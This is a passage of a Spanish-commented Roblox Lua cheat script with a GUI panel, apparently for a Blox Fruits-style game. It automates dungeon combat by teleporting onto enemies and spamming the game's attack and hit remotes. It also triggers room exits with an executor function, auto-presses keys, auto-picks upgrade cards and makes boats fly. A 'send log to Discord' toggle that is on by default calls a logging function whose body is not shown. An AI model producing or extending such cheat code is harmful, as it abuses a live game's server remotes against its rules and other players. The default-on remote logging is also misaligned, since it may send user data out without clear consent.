        elseif selectedWeaponType == "Melee" and currentTool.ToolTip == "Melee" then
            return
        end
    end

    local backpack = localPlayer:FindFirstChildOfClass("Backpack")
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local match = false
                if selectedWeaponType == "Sword" and (tool.ToolTip == "Sword" or string.find(string.lower(tool.Name), "sword") or string.find(string.lower(tool.Name), "katana")) then
                    match = true
                elseif selectedWeaponType == "Melee" and tool.ToolTip == "Melee" then
                    match = true
                end

                if match then
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid:EquipTool(tool)
                        break
                    end
                end
            end
        end
    end
end

local function StartAutoBuffs()
    task.spawn(function()
        while autoDungeonActive do
            ForceEquipWeapon()
            task.wait(0.3)
        end
    end)
    task.spawn(function()
        while autoDungeonActive do
            ForceActivateHaki()
            task.wait(0.1)
        end
    end)
end

local function GetClosestEnemy()
    if justDied then return nil end

    local closestEnemy = nil
    local shortestDistance = math.huge
    local currentCharacter = localPlayer.Character

    if not currentCharacter or not currentCharacter:FindFirstChild("HumanoidRootPart") then
        return nil
    end

    local myPos = currentCharacter.HumanoidRootPart.Position
    local sourceFolder = Workspace:FindFirstChild("Enemies") or enemiesFolder

    if sourceFolder then
        local isBossAlive = false
        local gasKnight = sourceFolder:FindFirstChild("Gas Knight")
        if gasKnight then
            local bossHum = gasKnight:FindFirstChildOfClass("Humanoid")
            if bossHum and bossHum.Health > 0 then
                isBossAlive = true
            end
        end

        local children = sourceFolder:GetChildren()
        local primaryCandidates = {}
        local backupCandidates = {}

        for i = 1, #children do
            local object = children[i]

            if object.Name == "PropHitboxPlaceholder" and not isBossAlive then
                continue
            end

            if object:IsA("Model") and object ~= currentCharacter and object.Name ~= "Blank Buddy" and object.Name ~= "Sombra" and object.Name ~= "Shadow" then
                local humanoid = object:FindFirstChildOfClass("Humanoid")
                local root = object:FindFirstChild("HumanoidRootPart") or object:FindFirstChild("Head")

                if humanoid and humanoid.Health > 0 and root and object.Parent then
                    local distance = (root.Position - myPos).Magnitude
                    if object ~= lastTarget then
                        table.insert(primaryCandidates, { model = object, dist = distance })
                    else
                        table.insert(backupCandidates, { model = object, dist = distance })
                    end
                end
            end
        end

        local targetList = #primaryCandidates > 0 and primaryCandidates or backupCandidates

        for i = 1, #targetList do
            local candidate = targetList[i]
            if candidate.dist < shortestDistance then
                shortestDistance = candidate.dist
                closestEnemy = candidate.model
            end
        end
    end
    return closestEnemy
end

local function TeleportToEnemy(enemy)
    if not enemy or not enemy.Parent or not humanoidRootPart then return false end

    local enemyRoot = enemy:FindFirstChild("HumanoidRootPart") or enemy:FindFirstChild("Head")
    if not enemyRoot then return false end

    local success = pcall(function()
        humanoidRootPart.CFrame = enemyRoot.CFrame * CFrame.new(0, attackHeight, 0)
    end)

    if not success then
        local raycastParams = RaycastParams.new()
        raycastParams.FilterDescendantsInstances = { character, enemy }
        raycastParams.FilterType = Enum.RaycastFilterType.Exclude

        local raycastResult = Workspace:Raycast(enemyRoot.Position, Vector3.new(0, -100, 0), raycastParams)
        if raycastResult then
            humanoidRootPart.CFrame = CFrame.new(raycastResult.Position + Vector3.new(0, 3, 0))
        end
        return false
    end
    return true
end

local function AttackEnemy(enemy)
    if not enemy or not enemy.Parent then return end

    local enemyHead = enemy:FindFirstChild("Head")
    local enemyHumanoid = enemy:FindFirstChildOfClass("Humanoid")
    if not enemyHead or not enemyHumanoid then return end

    local tool = character and character:FindFirstChildOfClass("Tool")
    if tool then tool:Activate() end

    pcall(function()
        local targetsTable = { { enemy, enemyHead } }
        registerAttack:FireServer(0)
        registerHit:FireServer(enemyHead, targetsTable)
    end)
end

local function GetCurrentRoomIndex(rooms)
    if not humanoidRootPart then return 1 end
    local myPos = humanoidRootPart.Position
    local currentRoomIdx = 1
    local minDistanceToRoomCenter = math.huge

    for i, room in ipairs(rooms) do
        local roomPart = room:FindFirstChildOfClass("Part") or room:FindFirstChildOfClass("MeshPart") or room:FindFirstChild("Floor")
        if roomPart then
            local dist = (roomPart.Position - myPos).Magnitude
            if dist < minDistanceToRoomCenter then
                minDistanceToRoomCenter = dist
                currentRoomIdx = i
            end
        end
    end
    return currentRoomIdx
end

local function AutoPassRoom()
    local mapFolder = Workspace:FindFirstChild("Map")
    if not mapFolder then return false end
    local dungeonFolder = mapFolder:FindFirstChild("Dungeon")
    if not dungeonFolder then return false end

    local rooms = dungeonFolder:GetChildren()
    if #rooms == 0 then return false end

    table.sort(rooms, function(a, b)
        local numA = tonumber(string.match(a.Name, "%d+")) or 0
        local numB = tonumber(string.match(b.Name, "%d+")) or 0
        return numA < numB
    end)

    local currentRoomIdx = GetCurrentRoomIndex(rooms)
    local activeRoom = rooms[currentRoomIdx]

    if activeRoom then
        local teleporter = activeRoom:FindFirstChild("ExitTeleporter")
        if teleporter then
            local rootPart = teleporter:FindFirstChild("Root")
            if rootPart and rootPart:IsA("BasePart") and humanoidRootPart then
                local touchTransmitter = rootPart:FindFirstChildOfClass("TouchTransmitter")
                if touchTransmitter then
                    humanoidRootPart.CFrame = rootPart.CFrame
                    task.wait(0.12)
                    if firetouchinterest then
                        firetouchinterest(humanoidRootPart, rootPart, 0)
                        task.wait(0.1)
                        firetouchinterest(humanoidRootPart, rootPart, 1)
                    end
                    if justDied then
                        justDied = false
                    end
                    return true
                end
            end
        end
    end
    return false
end

local function RotateTargets()
    while autoDungeonActive do
        currentTarget = GetClosestEnemy()

        if currentTarget and not justDied then
            lastTarget = currentTarget
            local enemyHumanoid = currentTarget:FindFirstChildOfClass("Humanoid")
            local timer = 0

            while autoDungeonActive and currentTarget and currentTarget.Parent and enemyHumanoid and enemyHumanoid.Health > 0 and timer < 0.35 and not justDied do
                TeleportToEnemy(currentTarget)
                AttackEnemy(currentTarget)

                task.wait(0.01)
                timer = timer + 0.01
            end
        else
            if justDied then
                local passed = false
                local attempts = 0
                while autoDungeonActive and justDied and attempts < 10 do
                    passed = AutoPassRoom()
                    if passed then
                        justDied = false
                        break
                    end
                    attempts = attempts + 1
                    task.wait(0.5)
                end
                if attempts >= 10 then
                    justDied = false
                end
            else
                task.wait(1.0)
                local passed = AutoPassRoom()
                if not passed then
                    task.wait(0.5)
                end
            end
        end
    end
end

-- 🎹 AUTO V4 POR TECLA (Lógica intacta)
local autoV4Active = false
task.spawn(function()
    while true do
        task.wait(0.5)
        if autoV4Active and autoDungeonActive and character then
            pcall(function()
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Y, false, game)
                task.wait(0.1)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Y, false, game)
            end)
        end
    end
end)

-- 🤖 AUTO ELEGIR CARTAS (Lógica intacta)
local autoBlessingActive = false
local PriorityList = { "Sword Damage", "Fortress", "Life Steal", "Race Meter", "Defense", "Health", "Energy" }

task.spawn(function()
    while true do
        if autoBlessingActive then
            local possiblePaths = {
                PlayerGui:FindFirstChild("BlessingGui"),
                PlayerGui:FindFirstChild("ChooseBlessing"),
                PlayerGui:FindFirstChild("Main") and PlayerGui.Main:FindFirstChild("ChooseBlessing"),
            }

            for _, gui in ipairs(possiblePaths) do
                if gui and gui.Enabled then
                    local container = gui:FindFirstChild("Buttons") or gui:FindFirstChild("Container") or gui:FindFirstChild("Frame")

                    if container then
                        for _, priorityName in ipairs(PriorityList) do
                            local prioridadLimpia = string.gsub(string.upper(priorityName), " ", "")

                            for _, button in ipairs(container:GetChildren()) do
                                if button:IsA("TextButton") or button:IsA("ImageButton") or button:IsA("Frame") then
                                    local textoCarta = button.Name
                                    for _, desc in ipairs(button:GetDescendants()) do
                                        if desc:IsA("TextLabel") then
                                            textoCarta = textoCarta .. desc.Text
                                        end
                                    end

                                    local textLimpio = string.gsub(string.upper(textoCarta), " ", "")

                                    if string.find(textLimpio, prioridadLimpia) then
                                        pcall(function()
                                            local clickTarget = button
                                            if button:IsA("Frame") then
                                                clickTarget = button:FindFirstChildOfClass("TextButton") or button
                                            end
                                            clickTarget.MouseButton1Click:Fire()
                                            if clickTarget:IsA("TextButton") or clickTarget:IsA("ImageButton") then
                                                clickTarget.Activated:Fire()
                                            end
                                        end)
                                        task.wait(2)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.3)
    end
end)

-- ==========================================================
-- 🛥️ SISTEMA BOAT FLY (Lógica intacta)
-- ==========================================================
local player = localPlayer
local isFlying = false
local isAuto = false
local isDancing = false
local isTweening = false
local defaultSpeed = 150
local targetHeight = 50
local currentDance = "Vaca"

local lv, ao, attachment, renderConnection, trackerConnection
local activeTween = nil
local lastBoatSeat = nil

local findBoatBtn = nil
local boatManualToggle = nil
local boatAutoToggle = nil
local boatDanceToggle = nil
local speedBox = nil
local heightBox = nil

local function SetBoatToggles(mode)
    if boatManualToggle then boatManualToggle.Set(mode == "Manual") end
    if boatAutoToggle then boatAutoToggle.Set(mode == "Auto") end
    if boatDanceToggle then boatDanceToggle.Set(mode == "Dance") end
end

local trackerGui = Instance.new("BillboardGui")
trackerGui.Name = "EdsuBoatTracker"
trackerGui.AlwaysOnTop = true
trackerGui.Size = UDim2.new(0, 150, 0, 50)
trackerGui.StudsOffset = Vector3.new(0, 8, 0)

local trackerText = Instance.new("TextLabel")
trackerText.Size = UDim2.new(1, 0, 1, 0)
trackerText.BackgroundTransparency = 1
trackerText.TextColor3 = Color3.fromRGB(255, 255, 255)
trackerText.TextStrokeTransparency = 0.5
trackerText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
trackerText.TextScaled = true
trackerText.Font = Enum.Font.GothamBlack
trackerText.Parent = trackerGui

local function monitorSeating(char)
    local humanoid = char:WaitForChild("Humanoid", 5)
    if humanoid then
        humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
            if humanoid.SeatPart then
                lastBoatSeat = humanoid.SeatPart
                trackerGui.Adornee = lastBoatSeat
                if not trackerGui.Parent then trackerGui.Parent = CoreGui end
            end
        end)
    end
end

trackerConnection = RunService.Heartbeat:Connect(function()
    if lastBoatSeat and lastBoatSeat.Parent and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local myPos = player.Character.HumanoidRootPart.Position
        local boatPos = lastBoatSeat.Position
        local dist = (boatPos - myPos).Magnitude
        trackerText.Text = string.format("🛥️ Tu Barco\n[%d m]", math.floor(dist))
        trackerGui.Enabled = true
    else
        trackerGui.Enabled = false
    end
end)

if player.Character then monitorSeating(player.Character) end
player.CharacterAdded:Connect(monitorSeating)

local function GetBestBoatSeat()
    local boatsFolder = workspace:FindFirstChild("Boats")
    if boatsFolder then
        for _, boat in pairs(boatsFolder:GetChildren()) do
            local owner = boat:FindFirstChild("Owner")
            if owner and tostring(owner.Value) == tostring(player.Name) then
                local seat = boat:FindFirstChild("VehicleSeat") or boat:FindFirstChildWhichIsA("VehicleSeat", true)
                if seat then
                    lastBoatSeat = seat
                    trackerGui.Adornee = lastBoatSeat
                    if not trackerGui.Parent then trackerGui.Parent = CoreGui end
                    return seat
                end
            end
        end
    end
    return lastBoatSeat
end

local function stopFlying()
    isFlying = false
    isAuto = false
    isDancing = false
    SetBoatToggles(nil)

    if renderConnection then renderConnection:Disconnect() renderConnection = nil end
    if lv then lv:Destroy() lv = nil end
    if ao then ao:Destroy() ao = nil end
    if attachment then attachment:Destroy() attachment = nil end
end

local function TweenToBoat(callback)
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChild("Humanoid")
    if not hrp or not humanoid then return end

    if isTweening then
        if activeTween then activeTween:Cancel() end
        isTweening = false
        hrp.Anchored = false
        if findBoatBtn then
            findBoatBtn.Text = "🔍 BUSCAR MI BARCO"
            findBoatBtn.BackgroundColor3 = Color3.fromRGB(30, 20, 0)
        end
        return
    end

    local bestSeat = GetBestBoatSeat()
    if not bestSeat or not bestSeat.Parent then
        if findBoatBtn then
            findBoatBtn.Text = "❌ SIN BARCO"
            task.wait(1)
            findBoatBtn.Text = "🔍 BUSCAR MI BARCO"
        end
        return
    end

    isTweening = true
    if findBoatBtn then
        findBoatBtn.Text = "🛑 CANCELAR VIAJE"
        findBoatBtn.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    end

    local dist = (bestSeat.Position - hrp.Position).Magnitude
    local tweenTime = dist / 250

    hrp.Anchored = true
    local tweenInfo = TweenInfo.new(tweenTime, Enum.EasingStyle.Linear)
    activeTween = TweenService:Create(hrp, tweenInfo, { CFrame = bestSeat.CFrame })
    activeTween:Play()

    local connection
    connection = activeTween.Completed:Connect(function(playbackState)
        connection:Disconnect()
        activeTween = nil

        if not isTweening then return end

        isTweening = false
        if playbackState == Enum.PlaybackState.Completed then
            hrp.Anchored = false
            bestSeat:Sit(humanoid)

            task.wait(0.2)
            if findBoatBtn then
                findBoatBtn.Text = "🔍 BUSCAR MI BARCO"
                findBoatBtn.BackgroundColor3 = Color3.fromRGB(30, 20, 0)
            end
            if callback then callback() end
        end
    end)
end

local function startFlying(mode)
    if isTweening then return end

    local char = player.Character
    if not char then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end

    if not humanoid.SeatPart then
        TweenToBoat(function() startFlying(mode) end)
        return
    end

    local seat = humanoid.SeatPart
    stopFlying()

    attachment = Instance.new("Attachment")
    attachment.Parent = seat

    lv = Instance.new("LinearVelocity")
    lv.Attachment0 = attachment
    lv.MaxForce = math.huge
    lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
    lv.Parent = seat

    ao = Instance.new("AlignOrientation")
    ao.Attachment0 = attachment
    ao.Mode = Enum.OrientationAlignmentMode.OneAttachment
    ao.MaxTorque = math.huge
    ao.Responsiveness = 200
    ao.Parent = seat

    isFlying = true
    isAuto = (mode == "Auto")
    isDancing = (mode == "Dance")
    SetBoatToggles(mode)

    renderConnection = RunService.Heartbeat:Connect(function()
        if not char or not humanoid or not humanoid.SeatPart or humanoid.SeatPart ~= seat then
            stopFlying()
            return
        end

        local currentY = seat.Position.Y
        local currentSpeed = speedBox and tonumber(speedBox.Text) or defaultSpeed
        local currentTargetHeight = heightBox and tonumber(heightBox.Text) or targetHeight
        local cam = workspace.CurrentCamera

        local lookVec = cam.CFrame.LookVector
        local forwardDir = Vector3.new(lookVec.X, 0, lookVec.Z).Unit
        local baseCFrame = CFrame.lookAt(Vector3.zero, forwardDir)

        local timeVar = tick()

        if isDancing then
            if currentDance == "Vaca" then
                lv.VectorVelocity = Vector3.new(0, math.sin(timeVar * 12) * 25, 0)
                ao.CFrame = baseCFrame * CFrame.Angles(math.rad(40) + (math.sin(timeVar * 12) * 0.15), math.sin(timeVar * 6) * 1.2, math.cos(timeVar * 12) * 0.3)
            elseif currentDance == "Borracho" then
                lv.VectorVelocity = Vector3.new(math.sin(timeVar * 1.5) * 20, math.sin(timeVar * 2) * 15, math.cos(timeVar * 1.2) * 20)
                ao.CFrame = baseCFrame * CFrame.Angles(math.sin(timeVar * 3) * 0.4, math.sin(timeVar * 1.5) * 2, math.cos(timeVar * 2) * 0.4)
            elseif currentDance == "Si" then
                lv.VectorVelocity = Vector3.new(0, 0, 0)
                ao.CFrame = baseCFrame * CFrame.Angles(math.sin(timeVar * 6) * 0.6, 0, 0)
            elseif currentDance == "No" then
                lv.VectorVelocity = Vector3.new(0, 0, 0)
                ao.CFrame = baseCFrame * CFrame.Angles(0, math.sin(timeVar * 7) * 0.7, 0)
            elseif currentDance == "Feliz" then
                lv.VectorVelocity = Vector3.new(0, math.abs(math.sin(timeVar * 10)) * 30, 0)
                ao.CFrame = baseCFrame * CFrame.Angles(math.sin(timeVar * 15) * 0.1, 0, 0)
            end
        elseif isAuto then
            local yVelocity = (currentTargetHeight - currentY) * 3
            lv.VectorVelocity = Vector3.new(forwardDir.X * currentSpeed, yVelocity, forwardDir.Z * currentSpeed)
            ao.CFrame = baseCFrame
        else
            local moveDir = humanoid.MoveDirection
            local yVelocity = (currentTargetHeight - currentY) * 3
            lv.VectorVelocity = Vector3.new(moveDir.X * currentSpeed, yVelocity, moveDir.Z * currentSpeed)
            ao.CFrame = baseCFrame
        end
    end)
end

-- ==========================================================
-- 🏗️ CONSTRUCCIÓN DE LA INTERFAZ
-- ==========================================================
local homeTab = CreateTabFrame("home", "🏠 Home")
local combatTab = CreateTabFrame("combat", "Combat Features")
local farmTab = CreateTabFrame("farmeo", "Farmeo Features")
local settingsTab = CreateTabFrame("settings", "Settings")

CreateTabButton("home", "🏠 Home")
CreateTabButton("combat", "⚔️ Combat")
CreateTabButton("farmeo", "⛏️ Farmeo")
CreateTabButton("settings", "⚙️ Settings")

-- 🏠 HOME: Servidor de Discord
CreateSection(homeTab, "💬 Comunidad")
CreateParagraph(homeTab, "Servidor de Discord", "Únete al servidor oficial de Edsusito para soporte, actualizaciones del script, noticias y comunidad.")
CreateButton(homeTab, "📋 COPIAR INVITACIÓN (discord.gg/UafYeFXuXs)", function(btn)
    local link = "https://discord.gg/UafYeFXuXs"
    pcall(function() setclipboard(link) end)
    btn.Text = "✅ ¡INVITACIÓN COPIADA!"
    task.delay(2, function()
        btn.Text = "📋 COPIAR INVITACIÓN (discord.gg/UafYeFXuXs)"
    end)
end, Color3.fromRGB(0, 80, 90))
CreateLabel(homeTab, "💙 https://discord.gg/UafYeFXuXs")
CreateLabel(homeTab, "Cualquier duda del panel, contacta por el Discord.")

-- ⚔️ COMBAT
CreateSection(combatTab, "⚡ Ataque")
faToggle = CreateToggle(combatTab, "⚡ Fast Attack Flagged", false, function(v)
    FlaggedEnabled = v
    if v then
        StartFlagged()
    else
        StopFlagged()
    end
end)
CreateSlider(combatTab, "Rango de Ataque", 1, 2000, FlaggedFastAttRange, "", function(v)
    FlaggedFastAttRange = v
end)
CreateSection(combatTab, "🔥 V4")
local v4Toggle = CreateToggle(combatTab, "🔥 Auto V4", false, function(v)
    v4Enabled = v
end)
CreateLabel(combatTab, "Tecla [U]: activa/desactiva Fast Attack. Tecla [N]: muestra/oculta el panel.")

-- ⛏️ FARMEO (Dungeon)
CreateSection(farmTab, "⚔️ Dungeon")
local dungeonToggle = CreateToggle(farmTab, "⚔️ Auto Completar Dungeon", false, function(v)
    autoDungeonActive = v
    if v then
        justDied = false
        StartAutoBuffs()
        coroutine.wrap(RotateTargets)()
    else
        currentTarget = nil
        lastTarget = nil
        justDied = false
    end
end)
local weaponDropdown = CreateDropdown(farmTab, "🎒 Arma", { "Espada", "Combate (Melee)" }, 1, function(opt)
    if opt == "Espada" then
        selectedWeaponType = "Sword"
    elseif opt == "Combate (Melee)" then
        selectedWeaponType = "Melee"
    end
end)
CreateSlider(farmTab, "Altura de Ataque", 10, 100, attackHeight, " studs", function(v)
    attackHeight = v
end)
CreateSection(farmTab, "✨ Extras")
local yv4Toggle = CreateToggle(farmTab, "🎹 Auto V4 (Tecla Y)", false, function(v)
    autoV4Active = v
end)
local blessingToggle = CreateToggle(farmTab, "🤖 Auto Elegir Cartas", false, function(v)
    autoBlessingActive = v
end)
CreateLabel(farmTab, "⚠️ La función de cartas depende de la actualización del juego.")

-- ⚙️ SETTINGS (Boat Fly + Sistema)
CreateSection(settingsTab, "🛥️ Barco")
findBoatBtn = CreateButton(settingsTab, "🔍 BUSCAR MI BARCO", function()
    TweenToBoat(nil)
end, Color3.fromRGB(30, 20, 0))
boatManualToggle = CreateToggle(settingsTab, "🛥️ Vuelo Manual", false, function(v)
    if v then
        if not (isFlying and not isAuto and not isDancing) then
            stopFlying()
            startFlying("Manual")
        end
    else
        if isFlying and not isAuto and not isDancing then stopFlying() end
    end
end)
boatAutoToggle = CreateToggle(settingsTab, "⏩ Auto Avance", false, function(v)
    if v then
        if not (isFlying and isAuto) then
            stopFlying()
            startFlying("Auto")
        end
    else
        if isFlying and isAuto then stopFlying() end
    end
end)
boatDanceToggle = CreateToggle(settingsTab, "🐄 Modo Baile", false, function(v)
    if v then
        if not (isFlying and isDancing) then
            stopFlying()
            startFlying("Dance")
        end
    else
        if isFlying and isDancing then stopFlying() end
    end
end)
speedBox = CreateTextBox(settingsTab, "🚀 Velocidad", tostring(defaultSpeed), function() end)
heightBox = CreateTextBox(settingsTab, "📏 Altura Y", tostring(targetHeight), function() end)
local danceDropdown = CreateDropdown(settingsTab, "🐄 Baile", { "Vaca Polaca", "Borracho", "Decir que Sí", "Decir que No", "Muy Feliz" }, 1, function(opt)
    local map = { ["Vaca Polaca"] = "Vaca", ["Borracho"] = "Borracho", ["Decir que Sí"] = "Si", ["Decir que No"] = "No", ["Muy Feliz"] = "Feliz" }
    currentDance = map[opt] or "Vaca"
end)
CreateSection(settingsTab, "📡 Sistema")
local webhookToggle = CreateToggle(settingsTab, "📡 Enviar Log a Discord", true, function(v)
    if v then task.spawn(SendLog) end
end)
CreateLabel(settingsTab, "Atajos: [N] mostrar/ocultar panel · [U] toggle Fast Attack.")

-- ==========================================================
-- 🪟 BOTONES DE VENTANA (Minimizar / Cerrar)
-- ==========================================================
local MinimizeBtn = New("TextButton", {
    Size = UDim2.new(0, S(26), 0, S(26)),
    Position = UDim2.new(1, -S(66), 0, S(10)),
    BackgroundTransparency = 1,
    Text = "–",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextTransparency = 0.4,
    Font = Enum.Font.GothamBold,
    TextSize = S(16),
    AutoButtonColor = false,
    ZIndex = 10,
    Parent = MainFrame,
})
local CloseBtn = New("TextButton", {
    Size = UDim2.new(0, S(26), 0, S(26)),
    Position = UDim2.new(1, -S(34), 0, S(10)),
    BackgroundTransparency = 1,
    Text = "✕",
    TextColor3 = Color3.fromRGB(255, 120, 120),
    TextTransparency = 0.25,
    Font = Enum.Font.GothamBold,
    TextSize = S(14),
    AutoButtonColor = false,
    ZIndex = 10,
    Parent = MainFrame,
})
MinimizeBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
end)
CloseBtn.MouseButton1Click:Connect(function()
    stopFlying()
    if trackerConnection then trackerConnection:Disconnect() end
    if trackerGui then trackerGui:Destroy() end
    ScreenGui:Destroy()
end)

-- ==========================================================
-- 🖱️ ARRASTRAR VENTANA
-- ==========================================================
local dragging = false
local dragStart = nil
local startPos = nil
local function startDrag(input)
    dragging = true
    dragStart = input.Position
    startPos = MainFrame.Position
end
TitleLabel.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        startDrag(input)
    end
end)
SubtitleLabel.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        startDrag(input)
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- ==========================================================
-- ⌨️ KEYBINDS GLOBALES
-- ==========================================================
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if UserInputService:GetFocusedTextBox() then return end
    if input.KeyCode == Enum.KeyCode.N then
        MainFrame.Visible = not MainFrame.Visible
    elseif input.KeyCode == Enum.KeyCode.U then
        ToggleFastAttack()
    end
end)

-- 🚀 Pestaña inicial
SelectTab("home")
